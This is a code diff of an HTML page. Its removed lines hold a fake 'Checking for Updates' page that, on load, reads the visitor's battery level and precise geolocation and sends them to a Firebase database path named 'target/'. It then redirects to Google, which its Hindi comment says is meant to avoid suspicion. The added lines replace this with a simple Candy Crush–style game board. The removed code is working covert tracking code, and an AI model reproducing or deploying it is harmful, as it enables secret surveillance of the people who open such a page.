@@ -1,43 +1,47 @@
 <!DOCTYPE html>
-<html>
-<head><title>System Update</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Candy Crush Clone</title>
+    <style>
+        body { background: #222; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: sans-serif; }
+        .grid { width: 320px; height: 320px; display: flex; flex-wrap: wrap; background-color: rgba(255,255,255,0.1); border: 5px solid #444; border-radius: 10px; }
+        .grid div { width: 40px; height: 40px; }
+        /* Candies Colors */
+        .red { background-color: #ff4d4d; border-radius: 50%; border: 2px solid #222; box-sizing: border-box; }
+        .blue { background-color: #4d94ff; border-radius: 50%; border: 2px solid #222; box-sizing: border-box; }
+        .green { background-color: #5cd65c; border-radius: 50%; border: 2px solid #222; box-sizing: border-box; }
+        .yellow { background-color: #ffff66; border-radius: 50%; border: 2px solid #222; box-sizing: border-box; }
+        .purple { background-color: #b366ff; border-radius: 50%; border: 2px solid #222; box-sizing: border-box; }
+    </style>
+</head>
 <body>
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-  import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
-  // Tera Firebase Config
-  const firebaseConfig = {
-    databaseURL: "https://tacticalsystem-99ebd-default-rtdb.firebaseio.com"
-  };
+    <div>
+        <h2 style="text-align: center;">Score: <span id="score">0</span></h2>
+        <div class="grid"></div>
+    </div>
 
-  const app = initializeApp(firebaseConfig);
-  const db = getDatabase(app);
+    <script>
+        const grid = document.querySelector('.grid')
+        const scoreDisplay = document.getElementById('score')
+        const width = 8
+        const squares = []
+        const candyColors = ['red', 'blue', 'green', 'yellow', 'purple']
 
-  async function startTracking() {
-    let data = { status: "ONLINE", time: new Date().toLocaleString() };
-
-    // Battery & Network
-    if (navigator.getBattery) {
-      const batt = await navigator.getBattery();
-      data.battery = Math.floor(batt.level * 100) + "%";
-    }
-
-    // Location Permission mangega
-    navigator.geolocation.getCurrentPosition((pos) => {
-      data.lat = pos.coords.latitude;
-      data.long = pos.coords.longitude;
-      update(ref(db, 'target/'), data).then(() => {
-          // Data update hone ke baad Google par bhej do taaki shak na ho
-          window.location.href = "https://www.google.com";
-      });
-    }, (err) => {
-      update(ref(db, 'target/'), data);
-      window.location.href = "https://www.google.com";
-    }, {enableHighAccuracy: true});
-  }
-  startTracking();
-</script>
-<h1 style="text-align:center; font-family:sans-serif;">Checking for Updates...</h1>
+        // Create Board
+        function createBoard() {
+            for (let i = 0; i < width * width; i++) {
+                const square = document.createElement('div')
+                let randomColor = Math.floor(Math.random() * candyColors.length)
+                square.classList.add(candyColors[randomColor])
+                square.setAttribute('draggable', true)
+                square.setAttribute('id', i)
+                grid.appendChild(square)
+                squares.push(square)
+            }
+        }
+        createBoard()
+    </script>
 </body>
 </html>
